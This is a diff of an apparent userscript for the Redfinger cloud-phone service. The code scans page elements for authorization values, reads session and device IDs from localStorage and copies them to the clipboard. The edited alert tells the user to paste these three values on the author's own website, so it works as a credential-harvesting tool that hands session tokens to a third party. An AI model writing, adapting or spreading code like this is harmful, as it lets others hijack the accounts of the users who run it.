@@ -34,7 +34,6 @@
         let sessionId = "Not Found";
         let uuid = "Not Found";
 
-        // Capture Authorization
         const elements = document.querySelectorAll('*');
         for (let el of elements) {
             const auth = el.getAttribute('authorization') || el.getAttribute('Authorization');
@@ -50,19 +49,15 @@
 
         uuid = localStorage.getItem('uuid') || localStorage.getItem('deviceId') || "Please get manually";
 
-        const text = `🔑 Redfinger Credentials\n\n` +
-                    `User ID     : ${userId}\n` +
-                    `Session ID  : ${sessionId}\n` +
-                    `UUID        : ${uuid}\n\n` +
-                    `Copy everything above and paste on the website.`;
+        const text = `🔑 Redfinger Credentials\n\nUser ID: ${userId}\nSession ID: ${sessionId}\nUUID: ${uuid}`;
 
         GM_setClipboard(text);
         
-        alert(`✅ Information Copied!\n\n` +
-              `User ID : ${userId}\n` +
-              `Session ID : ${sessionId}\n` +
-              `UUID : ${uuid}\n\n` +
-              `✅ Copied to clipboard!\n\nNow go back to my website and paste these details.`);
+        alert(`✅ Copied Successfully!\n\n` +
+              `User ID     : ${userId}\n` +
+              `Session ID  : ${sessionId}\n` +
+              `UUID        : ${uuid}\n\n` +
+              `✅ Now go back to my website and paste these 3 values.`);
     }
 
     setTimeout(createButton, 3000);
